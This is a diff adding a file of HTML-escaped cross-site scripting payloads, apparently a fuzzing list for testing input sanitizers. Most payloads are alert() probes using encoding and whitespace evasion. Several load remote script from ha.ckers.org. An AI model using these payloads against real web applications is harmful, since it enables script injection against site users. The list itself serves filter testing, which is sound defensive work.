@@ -1,0 +1,237 @@
+
+&lt;script&gt;alert(0)&lt;/script&gt;
+&amp;lt;script&amp;gt;alert(&amp;#39;1&amp;#39;);&amp;lt;/script&amp;gt;
+&lt;img src=x onerror=alert(2) /&gt;
+&lt;svg&gt;&lt;script&gt;123&lt;1&gt;alert(3)&lt;/script&gt;
+&quot;&gt;&lt;script&gt;alert(4)&lt;/script&gt;
+&#39;&gt;&lt;script&gt;alert(5)&lt;/script&gt;
+&gt;&lt;script&gt;alert(6)&lt;/script&gt;
+&lt;/script&gt;&lt;script&gt;alert(7)&lt;/script&gt;
+&lt; / script &gt;&lt; script &gt;alert(8)&lt; / script &gt;
+&nbsp;onfocus=JaVaSCript:alert(9) autofocus
+&quot; onfocus=JaVaSCript:alert(10) autofocus
+&#39; onfocus=JaVaSCript:alert(11) autofocus
+＜script＞alert(12)＜/script＞
+&lt;sc&lt;script&gt;ript&gt;alert(13)&lt;/sc&lt;/script&gt;ript&gt;
+--&gt;&lt;script&gt;alert(14)&lt;/script&gt;
+&quot;;alert(15);t=&quot;
+&#39;;alert(16);t=&#39;
+JavaSCript:alert(17)
+;alert(18);
+src=JaVaSCript:prompt(19)
+&quot;&gt;&lt;script&gt;alert(20);&lt;/script x=&quot;
+&#39;&gt;&lt;script&gt;alert(21);&lt;/script x=&#39;
+&gt;&lt;script&gt;alert(22);&lt;/script x=
+&quot; autofocus onkeyup=&quot;javascript:alert(23)
+&#39; autofocus onkeyup=&#39;javascript:alert(24)
+&lt;script\x20type=&quot;text/javascript&quot;&gt;javascript:alert(25);&lt;/script&gt;
+&lt;script\x3Etype=&quot;text/javascript&quot;&gt;javascript:alert(26);&lt;/script&gt;
+&lt;script\x0Dtype=&quot;text/javascript&quot;&gt;javascript:alert(27);&lt;/script&gt;
+&lt;script\x09type=&quot;text/javascript&quot;&gt;javascript:alert(28);&lt;/script&gt;
+&lt;script\x0Ctype=&quot;text/javascript&quot;&gt;javascript:alert(29);&lt;/script&gt;
+&lt;script\x2Ftype=&quot;text/javascript&quot;&gt;javascript:alert(30);&lt;/script&gt;
+&lt;script\x0Atype=&quot;text/javascript&quot;&gt;javascript:alert(31);&lt;/script&gt;
+&#39;`&quot;&gt;&lt;\x3Cscript&gt;javascript:alert(32)&lt;/script&gt;
+&#39;`&quot;&gt;&lt;\x00script&gt;javascript:alert(33)&lt;/script&gt;
+ABC&lt;div style=&quot;x\x3Aexpression(javascript:alert(34)&quot;&gt;DEF
+ABC&lt;div style=&quot;x:expression\x5C(javascript:alert(35)&quot;&gt;DEF
+ABC&lt;div style=&quot;x:expression\x00(javascript:alert(36)&quot;&gt;DEF
+ABC&lt;div style=&quot;x:exp\x00ression(javascript:alert(37)&quot;&gt;DEF
+ABC&lt;div style=&quot;x:exp\x5Cression(javascript:alert(38)&quot;&gt;DEF
+ABC&lt;div style=&quot;x:\x0Aexpression(javascript:alert(39)&quot;&gt;DEF
+ABC&lt;div style=&quot;x:\x09expression(javascript:alert(40)&quot;&gt;DEF
+ABC&lt;div style=&quot;x:\xE3\x80\x80expression(javascript:alert(41)&quot;&gt;DEF
+ABC&lt;div style=&quot;x:\xE2\x80\x84expression(javascript:alert(42)&quot;&gt;DEF
+ABC&lt;div style=&quot;x:\xC2\xA0expression(javascript:alert(43)&quot;&gt;DEF
+ABC&lt;div style=&quot;x:\xE2\x80\x80expression(javascript:alert(44)&quot;&gt;DEF
+ABC&lt;div style=&quot;x:\xE2\x80\x8Aexpression(javascript:alert(45)&quot;&gt;DEF
+ABC&lt;div style=&quot;x:\x0Dexpression(javascript:alert(46)&quot;&gt;DEF
+ABC&lt;div style=&quot;x:\x0Cexpression(javascript:alert(47)&quot;&gt;DEF
+ABC&lt;div style=&quot;x:\xE2\x80\x87expression(javascript:alert(48)&quot;&gt;DEF
+ABC&lt;div style=&quot;x:\xEF\xBB\xBFexpression(javascript:alert(49)&quot;&gt;DEF
+ABC&lt;div style=&quot;x:\x20expression(javascript:alert(50)&quot;&gt;DEF
+ABC&lt;div style=&quot;x:\xE2\x80\x88expression(javascript:alert(51)&quot;&gt;DEF
+ABC&lt;div style=&quot;x:\x00expression(javascript:alert(52)&quot;&gt;DEF
+ABC&lt;div style=&quot;x:\xE2\x80\x8Bexpression(javascript:alert(53)&quot;&gt;DEF
+ABC&lt;div style=&quot;x:\xE2\x80\x86expression(javascript:alert(54)&quot;&gt;DEF
+ABC&lt;div style=&quot;x:\xE2\x80\x85expression(javascript:alert(55)&quot;&gt;DEF
+ABC&lt;div style=&quot;x:\xE2\x80\x82expression(javascript:alert(56)&quot;&gt;DEF
+ABC&lt;div style=&quot;x:\x0Bexpression(javascript:alert(57)&quot;&gt;DEF
+ABC&lt;div style=&quot;x:\xE2\x80\x81expression(javascript:alert(58)&quot;&gt;DEF
+ABC&lt;div style=&quot;x:\xE2\x80\x83expression(javascript:alert(59)&quot;&gt;DEF
+ABC&lt;div style=&quot;x:\xE2\x80\x89expression(javascript:alert(60)&quot;&gt;DEF
+&lt;a href=&quot;\x0Bjavascript:javascript:alert(61)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\x0Fjavascript:javascript:alert(62)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\xC2\xA0javascript:javascript:alert(63)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\x05javascript:javascript:alert(64)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\xE1\xA0\x8Ejavascript:javascript:alert(65)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\x18javascript:javascript:alert(66)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\x11javascript:javascript:alert(67)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\xE2\x80\x88javascript:javascript:alert(68)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\xE2\x80\x89javascript:javascript:alert(69)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\xE2\x80\x80javascript:javascript:alert(70)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\x17javascript:javascript:alert(71)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\x03javascript:javascript:alert(72)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\x0Ejavascript:javascript:alert(73)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\x1Ajavascript:javascript:alert(74)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\x00javascript:javascript:alert(75)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\x10javascript:javascript:alert(76)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\xE2\x80\x82javascript:javascript:alert(77)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\x20javascript:javascript:alert(78)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\x13javascript:javascript:alert(79)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\x09javascript:javascript:alert(80)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\xE2\x80\x8Ajavascript:javascript:alert(81)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\x14javascript:javascript:alert(82)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\x19javascript:javascript:alert(83)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\xE2\x80\xAFjavascript:javascript:alert(84)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\x1Fjavascript:javascript:alert(85)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\xE2\x80\x81javascript:javascript:alert(86)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\x1Djavascript:javascript:alert(87)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\xE2\x80\x87javascript:javascript:alert(88)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\x07javascript:javascript:alert(89)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\xE1\x9A\x80javascript:javascript:alert(90)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\xE2\x80\x83javascript:javascript:alert(91)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\x04javascript:javascript:alert(92)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\x01javascript:javascript:alert(93)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\x08javascript:javascript:alert(94)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\xE2\x80\x84javascript:javascript:alert(95)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\xE2\x80\x86javascript:javascript:alert(96)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\xE3\x80\x80javascript:javascript:alert(97)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\x12javascript:javascript:alert(98)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\x0Djavascript:javascript:alert(99)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\x0Ajavascript:javascript:alert(100)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\x0Cjavascript:javascript:alert(101)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\x15javascript:javascript:alert(102)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\xE2\x80\xA8javascript:javascript:alert(103)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\x16javascript:javascript:alert(104)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\x02javascript:javascript:alert(105)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\x1Bjavascript:javascript:alert(106)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\x06javascript:javascript:alert(107)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\xE2\x80\xA9javascript:javascript:alert(108)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\xE2\x80\x85javascript:javascript:alert(109)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\x1Ejavascript:javascript:alert(110)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\xE2\x81\x9Fjavascript:javascript:alert(111)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;\x1Cjavascript:javascript:alert(112)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;javascript\x00:javascript:alert(113)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;javascript\x3A:javascript:alert(114)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;javascript\x09:javascript:alert(115)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;javascript\x0D:javascript:alert(116)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;javascript\x0A:javascript:alert(117)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;
+`&quot;&#39;&gt;&lt;img src=xxx:x \x0Aonerror=javascript:alert(118)&gt;
+`&quot;&#39;&gt;&lt;img src=xxx:x \x22onerror=javascript:alert(119)&gt;
+`&quot;&#39;&gt;&lt;img src=xxx:x \x0Bonerror=javascript:alert(120)&gt;
+`&quot;&#39;&gt;&lt;img src=xxx:x \x0Donerror=javascript:alert(121)&gt;
+`&quot;&#39;&gt;&lt;img src=xxx:x \x2Fonerror=javascript:alert(122)&gt;
+`&quot;&#39;&gt;&lt;img src=xxx:x \x09onerror=javascript:alert(123)&gt;
+`&quot;&#39;&gt;&lt;img src=xxx:x \x0Conerror=javascript:alert(124)&gt;
+`&quot;&#39;&gt;&lt;img src=xxx:x \x00onerror=javascript:alert(125)&gt;
+`&quot;&#39;&gt;&lt;img src=xxx:x \x27onerror=javascript:alert(126)&gt;
+`&quot;&#39;&gt;&lt;img src=xxx:x \x20onerror=javascript:alert(127)&gt;
+&quot;`&#39;&gt;&lt;script&gt;\x3Bjavascript:alert(128)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\x0Djavascript:alert(129)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\xEF\xBB\xBFjavascript:alert(130)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\xE2\x80\x81javascript:alert(131)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\xE2\x80\x84javascript:alert(132)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\xE3\x80\x80javascript:alert(133)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\x09javascript:alert(134)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\xE2\x80\x89javascript:alert(135)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\xE2\x80\x85javascript:alert(136)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\xE2\x80\x88javascript:alert(137)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\x00javascript:alert(138)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\xE2\x80\xA8javascript:alert(139)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\xE2\x80\x8Ajavascript:alert(140)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\xE1\x9A\x80javascript:alert(141)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\x0Cjavascript:alert(142)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\x2Bjavascript:alert(143)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\xF0\x90\x96\x9Ajavascript:alert(144)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;-javascript:alert(145)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\x0Ajavascript:alert(146)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\xE2\x80\xAFjavascript:alert(147)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\x7Ejavascript:alert(148)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\xE2\x80\x87javascript:alert(149)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\xE2\x81\x9Fjavascript:alert(150)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\xE2\x80\xA9javascript:alert(151)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\xC2\x85javascript:alert(152)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\xEF\xBF\xAEjavascript:alert(153)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\xE2\x80\x83javascript:alert(154)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\xE2\x80\x8Bjavascript:alert(155)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\xEF\xBF\xBEjavascript:alert(156)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\xE2\x80\x80javascript:alert(157)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\x21javascript:alert(158)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\xE2\x80\x82javascript:alert(159)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\xE2\x80\x86javascript:alert(160)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\xE1\xA0\x8Ejavascript:alert(161)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\x0Bjavascript:alert(162)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\x20javascript:alert(163)&lt;/script&gt;
+&quot;`&#39;&gt;&lt;script&gt;\xC2\xA0javascript:alert(164)&lt;/script&gt;
+&lt;img \x00src=x onerror=&quot;alert(165)&quot;&gt;
+&lt;img \x47src=x onerror=&quot;javascript:alert(166)&quot;&gt;
+&lt;img \x11src=x onerror=&quot;javascript:alert(167)&quot;&gt;
+&lt;img \x12src=x onerror=&quot;javascript:alert(168)&quot;&gt;
+&lt;img\x47src=x onerror=&quot;javascript:alert(169)&quot;&gt;
+&lt;img\x10src=x onerror=&quot;javascript:alert(170)&quot;&gt;
+&lt;img\x13src=x onerror=&quot;javascript:alert(171)&quot;&gt;
+&lt;img\x32src=x onerror=&quot;javascript:alert(172)&quot;&gt;
+&lt;img\x47src=x onerror=&quot;javascript:alert(173)&quot;&gt;
+&lt;img\x11src=x onerror=&quot;javascript:alert(174)&quot;&gt;
+&lt;img \x47src=x onerror=&quot;javascript:alert(175)&quot;&gt;
+&lt;img \x34src=x onerror=&quot;javascript:alert(176)&quot;&gt;
+&lt;img \x39src=x onerror=&quot;javascript:alert(177)&quot;&gt;
+&lt;img \x00src=x onerror=&quot;javascript:alert(178)&quot;&gt;
+&lt;img src\x09=x onerror=&quot;javascript:alert(179)&quot;&gt;
+&lt;img src\x10=x onerror=&quot;javascript:alert(180)&quot;&gt;
+&lt;img src\x13=x onerror=&quot;javascript:alert(181)&quot;&gt;
+&lt;img src\x32=x onerror=&quot;javascript:alert(182)&quot;&gt;
+&lt;img src\x12=x onerror=&quot;javascript:alert(183)&quot;&gt;
+&lt;img src\x11=x onerror=&quot;javascript:alert(184)&quot;&gt;
+&lt;img src\x00=x onerror=&quot;javascript:alert(185)&quot;&gt;
+&lt;img src\x47=x onerror=&quot;javascript:alert(186)&quot;&gt;
+&lt;img src=x\x09onerror=&quot;javascript:alert(187)&quot;&gt;
+&lt;img src=x\x10onerror=&quot;javascript:alert(188)&quot;&gt;
+&lt;img src=x\x11onerror=&quot;javascript:alert(189)&quot;&gt;
+&lt;img src=x\x12onerror=&quot;javascript:alert(190)&quot;&gt;
+&lt;img src=x\x13onerror=&quot;javascript:alert(191)&quot;&gt;
+&lt;img[a][b][c]src[d]=x[e]onerror=[f]&quot;alert(192)&quot;&gt;
+&lt;img src=x onerror=\x09&quot;javascript:alert(193)&quot;&gt;
+&lt;img src=x onerror=\x10&quot;javascript:alert(194)&quot;&gt;
+&lt;img src=x onerror=\x11&quot;javascript:alert(195)&quot;&gt;
+&lt;img src=x onerror=\x12&quot;javascript:alert(196)&quot;&gt;
+&lt;img src=x onerror=\x32&quot;javascript:alert(197)&quot;&gt;
+&lt;img src=x onerror=\x00&quot;javascript:alert(198)&quot;&gt;
+&lt;a href=java&amp;#1&amp;#2&amp;#3&amp;#4&amp;#5&amp;#6&amp;#7&amp;#8&amp;#11&amp;#12script:javascript:alert(199)&gt;XXX&lt;/a&gt;
+&lt;img src=&quot;x` `&lt;script&gt;javascript:alert(200)&lt;/script&gt;&quot;` `&gt;
+&lt;img src onerror /&quot; &#39;&quot;= alt=javascript:alert(201)//&quot;&gt;
+&lt;title onpropertychange=javascript:alert(202)&gt;&lt;/title&gt;&lt;title title=&gt;
+&lt;a href=http://foo.bar/#x=`y&gt;&lt;/a&gt;&lt;img alt=&quot;`&gt;&lt;img src=x:x onerror=javascript:alert(203)&gt;&lt;/a&gt;&quot;&gt;
+&lt;!--[if]&gt;&lt;script&gt;javascript:alert(204)&lt;/script --&gt;
+&lt;!--[if&lt;img src=x onerror=javascript:alert(205)//]&gt; --&gt;
+&lt;script src=&quot;/\%(jscript)s&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;\\%(jscript)s&quot;&gt;&lt;/script&gt;
+&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;206&quot;)&lt;/SCRIPT&gt;&quot;&gt;
+&lt;IMG SRC=javascript:alert(String.fromCharCode(50,48,55))&gt;
+&lt;IMG SRC=# onmouseover=&quot;alert(&#39;208&#39;)&quot;&gt;
+&lt;IMG SRC= onmouseover=&quot;alert(&#39;209&#39;)&quot;&gt;
+&lt;IMG onmouseover=&quot;alert(&#39;210&#39;)&quot;&gt;
+&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#50;&amp;#49;&amp;#49;&amp;#39;&amp;#41;&gt;
+&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000050&amp;#0000049&amp;#0000050&amp;#0000039&amp;#0000041&gt;
+&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x32&amp;#x31&amp;#x33&amp;#x27&amp;#x29&gt;
+&lt;IMG SRC=&quot;jav &nbsp; ascript:alert(&#39;214&#39;);&quot;&gt;
+&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&#39;215&#39;);&quot;&gt;
+&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&#39;216&#39;);&quot;&gt;
+&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&#39;217&#39;);&quot;&gt;
+perl -e &#39;print &quot;&lt;IMG SRC=java\0script:alert(\&quot;218\&quot;)&gt;&quot;;&#39; &gt; out
+&lt;IMG SRC=&quot; &amp;#14; &nbsp;javascript:alert(&#39;219&#39;);&quot;&gt;
+&lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;220&quot;)&gt;
+&lt;SCRIPT/SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;&lt;SCRIPT&gt;alert(&quot;221&quot;);//&lt;&lt;/SCRIPT&gt;
+&lt;SCRIPT SRC=http://ha.ckers.org/xss.js?&lt; B &gt;
+&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;
+&lt;IMG SRC=&quot;javascript:alert(&#39;222&#39;)&quot;
+&lt;iframe src=http://ha.ckers.org/scriptlet.html &lt;
+\&quot;;alert(&#39;223&#39;);//
+&lt;u oncopy=alert()&gt; Copy me&lt;/u&gt;
+&lt;i onwheel=alert(224)&gt; Scroll over me &lt;/i&gt;
+&lt;plaintext&gt;
+http://a/%%30%30
+&lt;/textarea&gt;&lt;script&gt;alert(225)&lt;/script&gt;
